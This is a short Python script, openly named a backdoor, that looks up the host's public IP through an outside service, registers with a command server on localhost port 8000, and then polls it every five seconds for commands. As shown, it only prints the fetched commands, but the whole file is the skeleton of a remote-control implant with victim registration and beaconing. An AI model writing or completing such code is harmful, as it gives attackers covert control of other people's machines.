import requests,time

class backdoor:
    def __init__(self):
        self.url = "http://127.0.0.1:8000/"
        ip = requests.get("https://api64.ipify.org/").text
        self.id = requests.get(self.url+"api/get_id/"+ip).json()['id']
        while True:
            requests.get(self.url+"api/ping/"+str(self.id))
            for i in requests.get(self.url+"api/commands/"+str(self.id)).json():
                print(i)
            
            time.sleep(5)
backdoor()